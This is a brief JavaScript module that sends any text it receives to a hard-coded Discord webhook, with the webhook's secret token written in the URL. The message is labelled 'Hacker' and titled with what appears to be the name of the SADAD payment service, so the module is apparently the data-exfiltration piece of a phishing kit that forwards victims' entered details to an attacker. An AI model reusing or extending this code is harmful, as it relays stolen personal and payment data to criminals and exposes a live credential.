import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1322836300788797500/uBe6ZDEAZkvAJXh32bL0GJGsDR1GUHmsK6LslqdSLdnhN8EPvVdKAoIanNQCgI6HaA33",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
